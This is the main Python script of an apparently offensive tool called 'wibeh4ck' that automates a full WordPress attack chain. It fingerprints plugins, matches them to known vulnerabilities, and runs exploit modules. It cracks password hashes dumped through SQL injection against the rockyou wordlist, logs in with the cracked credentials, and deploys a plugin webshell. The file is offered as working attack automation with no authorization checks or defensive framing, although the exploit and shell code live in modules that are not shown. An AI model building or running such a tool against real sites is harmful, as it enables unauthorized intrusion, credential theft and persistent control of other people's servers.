#!/usr/bin/env python3
import argparse, sys, time, os

from core.http import HTTP
from core.output import banner, print_recon, print_matches, print_result, print_shell, export_json
from recon.fingerprint import fingerprint
from recon.db import load_db, match_vulns
from exploit.loader import load_modules, run_exploits
from post.crack import crack_hashes
from post.login import try_logins
from post.shell import deploy_shell

DEFAULT_DB = "data/wordfence_sample.json"
DEFAULT_WORDLIST = "wordlists/rockyou.txt"
MODULES_DIR = "exploit/modules"


def main():
    p = argparse.ArgumentParser(prog="wibeh4ck")
    p.add_argument("-t", "--target", help="target URL")
    p.add_argument("--wordlist", default=DEFAULT_WORDLIST)
    p.add_argument("--proxy", default=None)
    p.add_argument("--json", dest="json_out", default=None)
    p.add_argument("--shell-password", default=None)
    p.add_argument("--no-crack", action="store_true")
    p.add_argument("--no-shell", action="store_true")
    p.add_argument("--timeout", type=int, default=15)
    args = p.parse_args()

    if not args.target:
        p.error("need --target")

    banner()
    start = time.time()

    http = HTTP(proxy=args.proxy, timeout=args.timeout)
    print("[*] fingerprinting target...")
    recon = fingerprint(args.target, http)
    print_recon(recon)

    print("[*] matching vulnerabilities...")
    db = load_db(DEFAULT_DB)
    matches = match_vulns(recon.get("plugins", []), db)
    print_matches(matches)

    result = {"target": args.target, "recon": recon, "matches": matches,
              "exploit": None, "cracked": None, "admin": None, "shell": None}

    if matches:
        modules = load_modules(MODULES_DIR)
        print(f"[*] {len(modules)} exploit module(s) loaded, attempting in CVSS order...")
        exploit = run_exploits(args.target, recon, http, matches, modules)
        result["exploit"] = exploit

        if exploit and exploit.get("type") == "sqli" and exploit.get("users"):
            hashes = [u["hash"] for u in exploit["users"] if u.get("hash")]
            if hashes and not args.no_crack:
                print(f"[*] cracking {len(hashes)} hash(es) with {args.wordlist}")
                cracked = crack_hashes(hashes, args.wordlist)
                result["cracked"] = cracked
                if cracked.get("cracked"):
                    logins = [{"user": u["login"], "pass": cracked["cracked"].get(u["hash"])}
                              for u in exploit["users"] if u.get("hash") in cracked["cracked"]]
                    admin = try_logins(args.target, http, logins)
                    result["admin"] = admin

        if result["admin"] and not args.no_shell:
            pw = args.shell_password or os.urandom(12).hex()
            print("[*] deploying plugin webshell...")
            shell = deploy_shell(args.target, http, result["admin"]["user"],
                                 result["admin"]["pass"], pw)
            result["shell"] = shell
            print_shell(shell)

    result["elapsed"] = round(time.time() - start, 2)
    print_result(result)

    if args.json_out:
        export_json(args.json_out, result)
        print(f"[*] results written to {args.json_out}")


if __name__ == "__main__":
    main()
